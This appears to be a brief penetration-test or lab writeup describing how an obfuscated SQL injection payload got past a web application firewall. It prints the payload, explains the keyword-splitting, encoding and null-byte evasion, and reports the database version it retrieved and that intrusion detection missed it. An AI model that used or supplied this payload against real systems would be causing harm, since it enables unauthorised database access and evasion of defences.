# Bypassed WAF Report #1

## 🎯 Target:
Example vulnerable web application behind a WAF.

## 💥 Payload Used:
```sql
' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--%00
```

## 🧠 Filter Details:
- WAF blocked basic keywords like `UNION`, `SELECT`, and `--`.
- Also blocked long payloads and special characters like `;` and `#`.

## 🛠️ Bypass Strategy:
- Used dynamic string concatenation.
- Replaced spaces with `%20`.
- Added null byte at the end to cut off additional filtering.

## ✅ Result:
Successfully retrieved SQL version behind WAF:
```
Microsoft SQL Server 2017 (RTM-CU30)
```

## 📌 Notes:
- Manual observation helped confirm filter behavior.
- IDS logs didn’t catch the obfuscated payload.
